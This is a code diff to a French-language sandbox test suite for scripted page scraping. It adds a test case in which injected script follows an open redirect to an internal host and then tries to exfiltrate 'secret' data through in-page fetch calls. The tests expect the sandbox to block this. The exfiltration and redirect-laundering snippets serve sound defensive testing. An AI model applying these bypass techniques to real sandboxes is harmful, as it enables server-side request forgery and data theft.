@@ -579,11 +579,19 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
       "await ctx.page.evaluate((u) => { history.pushState({}, '', '/zz_test_push'); setTimeout(() => { fetch(u).catch(() => {}); }, 300); return 1; }, input.url);\n" +
         "try { await ctx.page.waitForSelector('#zz_test_absent', { timeout: 2000 }); } catch (e) { /* attendu */ }",
     ],
-  ])('assert_sandbox (ctx.page, D-29) : blanchiment par %s (hôte hors API contacté par le code injecté pendant une opération de l’hôte, puis exfiltration) → sandbox_violation, enfant tué, 0 requête', async (_name, launder) => {
+    [
+      // Avant tout evaluate (guet désarmé) : le saut hors API d'une navigation du script n'entre jamais dans la ligne de base.
+      'ctx.page.goto vers une redirection ouverte avant tout evaluate',
+      'try { await ctx.page.goto(input.redirect); } catch (e) { /* saut coupé */ }\nawait ctx.page.goto(input.spa);',
+    ],
+  ])('assert_sandbox (ctx.page, D-29) : blanchiment par %s (hôte hors API contacté pendant une opération de l’hôte, puis exfiltration par le code injecté) → sandbox_violation, enfant tué, 0 requête', async (_name, launder) => {
     const out = await script(
       launder +
         "\nawait ctx.page.evaluate((u) => fetch(u + '&zz_test_data=secret').then(() => 1, () => 0), input.url);\nctx.emit({ title: 'jamais', price: 1 });",
-      { allowedHosts: [SPA, SLOW], input: { url: `${base(INTERNAL)}/collect?zz_test_exfil=1`, slow: `${base(SLOW)}/data?wait_seconds=1` } },
+      {
+        allowedHosts: [SPA, SLOW, SSRF],
+        input: { url: `${base(INTERNAL)}/collect?zz_test_exfil=1`, slow: `${base(SLOW)}/data?wait_seconds=1`, redirect: `${base(SSRF)}/to-internal`, spa: `${base(SPA)}/` },
+      },
     );
     expect(out.result).toMatchObject({ ok: false, failure: { failure_class: 'code_error', detail: 'sandbox_violation' } });
     expect(out.violations.find((v) => v.reason === 'domain_not_allowed')?.detail).toBe(INTERNAL);
@@ -715,7 +723,7 @@ describe('E3 en script dans le bac à sable (1.5) : ctx.page.*, ctx.fetch, ctx.e
     expect((await client.stats()).hosts[SPA]?.paths['/zz_test_write'] ?? 0).toBe(1);
   }, 60_000);
 
-  test('assert_no_personal_data_in_logs (E3 en script) : ctx.log de données extraites → jamais dans le journal du worker, rendu pour le journal du run', async () => {
+  test('assert_no_personal_data_in_logs (E3 en script) : ctx.log de données extraites → jamais dans le journal du worker, gardé en mémoire pour l’essai', async () => {
     const lines: string[] = [];
     const capture = {
       info: (o: unknown) => void lines.push(JSON.stringify(o)),
